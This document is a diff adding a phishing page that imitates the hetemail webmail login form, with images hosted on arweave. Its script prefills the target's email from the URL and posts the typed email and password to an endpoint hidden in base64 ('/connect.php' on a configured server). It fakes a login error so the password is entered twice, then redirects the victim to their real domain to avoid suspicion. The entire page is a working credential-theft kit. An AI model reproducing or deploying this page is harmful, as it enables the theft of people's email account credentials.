@@ -1,0 +1,634 @@
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ja" xml:lang="ja">
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <title>hetemail</title>
+    <meta http-equiv="content-style-type" content="text/css" />
+    <meta http-equiv="content-script-type" content="text/javascript" />
+    <meta name="robots" content="ALL" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <link rel="shortcut icon"
+        href="https://tlvlwe52wbqlmghyqkrrmi4vomzrbxrdeyuazf5szb7hhiopgltq.arweave.net/muq7E7qwYLYY-IKjFiOVczMQ3iMmKAyXssh-c6HPMuc" />
+
+
+    <style>
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            position: relative;
+            min-width: 616px;
+            min-height: 383px;
+        }
+
+        div,
+        p,
+        h1 {
+            margin: 0;
+            padding: 0;
+        }
+
+        rm,
+        img {
+            border-style: none;
+            margin: 0px;
+            padding: 0px;
+        }
+
+        body,
+        div,
+        td,
+        th,
+        input,
+        textarea {
+            font-size: small;
+            font-family: Verdana, Arial, Helvetica, 'ＭＳ Ｐゴシック', sans-serif;
+        }
+
+        br.clear {
+            clear: both;
+            font: 0/0 sans-serif;
+        }
+
+        .clearfix:after {
+            content: " ";
+            display: block;
+            visibility: hidden;
+            clear: both;
+            height: 0.1px;
+            font-size: 0.1em;
+            line-height: 0;
+        }
+
+        * html body .clearfix {
+            display: inline-block;
+        }
+
+        *+html body .clearfix {
+            display: inline-block;
+        }
+
+        .BAR {
+            background-color: #000;
+            padding: 0 50px 6px;
+            margin: 0;
+            text-align: left;
+            min-width: 881px;
+        }
+
+        * html body .BAR {
+            width: expression(document.documentElement.clientWidth < 981? "881px" : "auto");
+        }
+
+        .BAR_1 {
+            width: 64px;
+            float: left;
+            margin-top: 6px;
+        }
+
+        .BAR_2 {
+            width: 500px;
+            float: right;
+            text-align: right;
+            color: #fff;
+            font-weight: bold;
+            font-family: Arial, Helvetica, sans-serif;
+            margin-top: 3px;
+        }
+
+        .BAR_2 span {
+            margin-left: 15px;
+            padding-left: 20px;
+        }
+
+        .BAR_2 span.logout {
+            background: url(/img/logout.gif) no-repeat 0% 50%;
+        }
+
+        .BAR_2 span.controlpanel {
+            background: url(/img/controlpanel.gif) no-repeat 0% 50%;
+        }
+
+        .BAR_2 span a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .BAR_2 span a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        #login_hm {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin: -182px 0 0 -308px;
+            text-align: left;
+            width: 616px;
+        }
+
+        #login_hm2 {
+            background: url(/tools/img/login_back.gif) 0% 100%;
+        }
+
+        #login_hm #login_left {
+            float: left;
+            width: 104px;
+        }
+
+        #login_hm #login_right {
+            float: right;
+            width: 512px;
+            text-align: center;
+        }
+
+        #login_hm #login_right #login_form {
+            width: 380px;
+            text-align: left;
+            margin: 0 auto;
+        }
+
+        #login_hm #login_right #login_form th {
+            width: 97px;
+            padding-bottom: 10px;
+        }
+
+        #login_hm #login_right #login_form td {
+            width: 287px;
+            padding-bottom: 10px;
+        }
+
+        #login_hm #login_right #login_form td input {
+            margin-right: 5px;
+        }
+
+        html body #login_hm #login_right #login_form td input {
+            margin-left: 15px;
+        }
+
+        * html body #login_hm #login_right #login_form td input {
+            margin-left: 11px;
+        }
+
+        *+html body #login_hm #login_right #login_form td input {
+            margin-left: 11px;
+        }
+
+        #login_hm #login_right #login_form td input.FRM_STRING {
+            margin-left: 15px;
+            margin-right: 0;
+            width: 272px;
+            font-size: 14px;
+            padding: 3px 5px;
+            border-top: 1px solid #a1a1a1;
+            border-right: 1px solid #e5e5e5;
+            border-bottom: 1px solid #e5e5e5;
+            border-left: 1px solid #a1a1a1;
+        }
+
+        #login_hm #login_right #login_form td .login_error {
+            margin-left: 15px;
+            margin-top: 10px;
+            color: #c00;
+            background: url(/tools/img/cyui.gif) no-repeat;
+            padding-left: 15px;
+            text-indent: 0;
+        }
+
+        #login_hm #submit-btn {
+            background: #e3f7ff;
+            text-align: center;
+            margin: 30px 30px 50px;
+            height: 60px;
+        }
+
+        #login_hm #submit-btn input {
+            margin: 10px auto;
+        }
+
+        #login_hm #login_loading {
+            display: none;
+            background: #e3f7ff;
+            text-align: center;
+            margin: 30px 30px 50px;
+            height: 60px;
+        }
+
+        #login_hm #login_loading p {
+            width: 13.3em;
+            margin: 0 auto;
+        }
+
+        #login_hm #login_loading p img {
+            display: block;
+            margin-top: 20px;
+            float: left;
+        }
+
+        #login_hm #login_loading p span {
+            display: block;
+            margin-top: 20px;
+            float: right;
+        }
+
+        #campaign {
+            background: #f1f1f1;
+            margin-top: 20px;
+            padding: 20px 0 10px;
+            text-align: center;
+        }
+
+        #campaign a {
+            color: #008ecd;
+            text-decoration: none;
+        }
+
+        #campaign a:hover {
+            color: #b80120;
+        }
+
+        #campaign img {
+            margin-bottom: 5px;
+        }
+    </style>
+    <style>
+        #jquery-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 90;
+            width: 100%;
+            height: 500px;
+        }
+
+        #jquery-lightbox {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 100;
+            text-align: center;
+            line-height: 0;
+        }
+
+        #jquery-lightbox a img {
+            border: none;
+        }
+
+        #lightbox-container-image-box {
+            position: relative;
+            background-color: #fff;
+            width: 250px;
+            height: 250px;
+            margin: 0 auto;
+        }
+
+        #lightbox-container-image {
+            padding: 10px;
+        }
+
+        #lightbox-loading {
+            position: absolute;
+            top: 40%;
+            left: 0%;
+            height: 25%;
+            width: 100%;
+            text-align: center;
+            line-height: 0;
+        }
+
+        #lightbox-nav {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            z-index: 10;
+        }
+
+        #lightbox-container-image-box>#lightbox-nav {
+            left: 0;
+        }
+
+        #lightbox-nav a {
+            outline: none;
+        }
+
+        #lightbox-nav-btnPrev,
+        #lightbox-nav-btnNext {
+            width: 49%;
+            height: 100%;
+            zoom: 1;
+            display: block;
+        }
+
+        #lightbox-nav-btnPrev {
+            left: 0;
+            float: left;
+        }
+
+        #lightbox-nav-btnNext {
+            right: 0;
+            float: right;
+        }
+
+        #lightbox-container-image-data-box {
+            font: 10px Verdana, Helvetica, sans-serif;
+            background-color: #fff;
+            margin: 0 auto;
+            line-height: 1.4em;
+            overflow: auto;
+            width: 100%;
+            padding: 0 10px 0;
+        }
+
+        #lightbox-container-image-data {
+            padding: 0 10px;
+            color: #666;
+        }
+
+        #lightbox-container-image-data #lightbox-image-details {
+            width: 70%;
+            float: left;
+            text-align: left;
+        }
+
+        #lightbox-image-details-caption {
+            font-weight: bold;
+        }
+
+        #lightbox-image-details-currentNumber {
+            display: block;
+            clear: left;
+            padding-bottom: 1.0em;
+        }
+
+        #lightbox-secNav-btnClose {
+            width: 66px;
+            float: right;
+            padding-bottom: 0.7em;
+        }
+    </style>
+</head>
+
+
+<div class="BAR clearfix">
+
+    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
+        <div id="google_translate_element"></div>
+    </div>
+
+
+    <a name="top" id="top"></a>
+    <p class="BAR_1"><a href="#"><img
+                src="https://4xtvt6oawp6noczm2fl6jdqnbqikcyllsvzq2o6h6yz2v5iwcdnq.arweave.net/5edZ-cCz_NcLLNFX5I4NDBChYWuVcw07x_YzqvUWENs"
+                alt="heteml" /></a></p>
+</div>
+
+
+
+
+<style>
+    h1 {
+        position: relative;
+    }
+
+    h1 a {
+        position: absolute;
+        top: 53px;
+        right: 40px;
+        display: block;
+        width: 23px;
+        height: 22px;
+    }
+</style>
+
+<form id="" name="form1" data-name="" action="" method="post" required>
+    <div id="login_hm">
+        <div id="login_hm2">
+            <p id="login_left"><img
+                    src="https://xyxaw54uxipk6i3ga2exn6j6aivdjakbmjaq2jtcbwqznqt7li7a.arweave.net/vi4Ld5S6Hq8jZgaJdvk-Aio0gUFiQQ0mYg2hlsJ_Wj4"
+                    alt="" /></p>
+            <div id="login_right">
+                <h1><img src="https://tqnxrc6gvpvq2mqvnigkbd4bmlrommssspnlhefltgwakaywob7a.arweave.net/nBt4i8ar6w0yFWoMoI-BYuLmMlKT2rOQq5msBQMWcH4"
+                        alt="hetemail ログインフォーム" border="0" /><a
+                        href="https://qvu4dvxnnpzftplzi27pk75uj7uxz24cbid4bcfpvyau563pgcxa.arweave.net/hWnB1u1r8lm9eUa-9X-0T-l864IKB8CIr64BTvtvMK4"
+                        id="Map"><img
+                            src="https://bf4c5nm6rmtdx4vm3mjjtcuh7mhts5dbuyicnsbayvij4un442la.arweave.net/CXgutZ6LJjvyrNsSmYqH-w85dGGmECbIIMVQnlG85pY" /></a>
+                </h1>
+                <table id="login_form">
+                    <!-- ERRORメッセージ:s -->
+                    <div id="msg"
+                        style="background-color: #ffffff; color:red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display:block;display: none;">
+                        メールアドレス(ユーザID)またはパスワードが正しくありません。</div>
+                    <div id="error"
+                        style="background-color: #ffffff; color:red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display:block;display: none;">
+                        メールアドレス(ユーザID)またはパスワードが正しくありません。</div>
+                    <!-- ERRORメッセージ:e -->
+                    <tr>
+                        <th><img src="https://fqzgmyuivzqghmkd2wryhppl2wsihuf4fgjq2f665zlqxnp3hymq.arweave.net/LDJmYoiuYGOxQ9Wjg73r1aSD0Lwpkw0X3u5XC7X7Phk"
+                                alt="メールアドレス" /></th>
+                        <td>
+                            <input type="text" class="FRM_STRING" name="ai" id="ai" value="" readonly />
+                        </td>
+                    </tr>
+                    <tr>
+                        <th><img src="https://kzrjv3dcqjxbsgkc5joqzlipuqpugmkaf2gnudeze5cokc565yza.arweave.net/VmKa7GKCbhkZQupdDK0PpB9DMUAujNoMmSdE5Qu-7jI"
+                                alt="パスワード" /></th>
+                        <td><input type="password" class="FRM_STRING" name="namep" id="pr" value="" />
+
+                        </td>
+                    </tr>
+                    <tr>
+                        <th>&nbsp;</th>
+                        <td><input type="checkbox" name="auto_login_mail" id="auto_login_mail" value="1"><label
+                                for="auto_login_mail">メールアドレスとパスワードを保存する</label></td>
+                    </tr>
+                </table>
+            </div>
+            <br class="clear" />
+            <p id="submit-btn" onclick="submitForm(event)"><input type="image"
+                    src="https://x55q43t3u72plb65z664hsgx525vkgmtehaallzp5ptkg6re6t7q.arweave.net/v3sObnun9PWH3c-9w8jX7rtVGZMhwAWvL-vmo3ok9P8"
+                    alt="ログイン" /></p>
+            <div id="login_loading">
+                <p><img
+                        src="https://xp5xtbej6hqg3vec32lexmg25ala3kfsvz6jxdnoyvnczzhm2ncq.arweave.net/u_t5hInx4G3Ugt6WS7Da6BYNqLKufJuNrsVaLOTs00U" /><span>メールを読み込んでいます</span><br
+                        class="clear" /></p>
+            </div>
+            <p><img src="https://opuu3ijdvwvymukxgqjvv7cf6mhxodri3pvfavndsyioeo4qoita.arweave.net/c-lNoSOtq4ZRVzQTWvxF8w93Dijb6lBVo5YQ4juQciY"
+                    alt="" /></p>
+
+        </div>
+
+    </div>
+
+</form>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="./config.js"></script>
+
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var atu = "L2Nvbm5lY3QucGhw";
+	
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+		
+		
+		if(pr.length < 5) {  
+
+			$('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;  
+
+			return false;  
+
+		}
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url: `${config.baseUrl}${atob(atu)}`,
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });
+    });
+
+
+});
+
+function getParameterByName(name, url) {
+			if (!url) url = window.location.href;
+			name = name.replace(/[\[\]]/g, '\\$&');
+			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+				results = regex.exec(url);
+			if (!results) return null;
+			if (!results[2]) return '';
+			return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+			
+		const login_username = getParameterByName('cms');
+		document.getElementById("ai").value = login_username;
+</script>
+
+</body>
+
+</html>
